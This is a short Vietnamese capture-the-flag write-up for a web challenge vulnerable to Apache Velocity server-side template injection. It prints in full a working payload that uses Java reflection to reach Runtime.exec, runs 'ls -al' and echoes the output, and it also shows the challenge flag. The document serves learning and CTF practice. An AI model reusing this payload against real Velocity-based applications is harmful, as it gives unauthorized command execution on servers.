# Đề bài:
![Screenshot (409)](https://github.com/ductohno/ctf_wup/assets/152991010/b3bc7412-ed82-482c-8bf3-2f4a3597374a)

Khi truy cập vào trang web, ta thấy 1 giao diện cho phép tìm kiếm cái gì đó

![Screenshot (410)](https://github.com/ductohno/ctf_wup/assets/152991010/92e06aae-bfe4-41b2-9053-a703943ff211)

# Hãy chú ý tới ảnh sau:

![Screenshot (411)](https://github.com/ductohno/ctf_wup/assets/152991010/a4580cef-b8f1-4f8c-8d7e-41944e1101b1)

Velocity là 1 template framework, và do đó 100% lỗ hổng của bài này là ssti velocity
Biết thế nên tôi lập tức vác xác đi tìm payload
Tuy nhiên payload ở cả payloadallthething và hacktrick đều ko hiệu quả

Và rồi, tôi đã tìm được thứ cần tìm:
https://github.com/epinna/tplmap/issues/9

# Payload:
```
#set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("ls -al"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output
```

Hỡi ôi và chiếc payload giời cứu, và flag xuất hiện

![Screenshot (412)](https://github.com/ductohno/ctf_wup/assets/152991010/2d25eb7f-d812-4675-a3fa-8cdbaefcde76)

## Flag:
```
FUSec{v3l0c1ty_SSTI_1s_34sy_4s_h3ll}
```
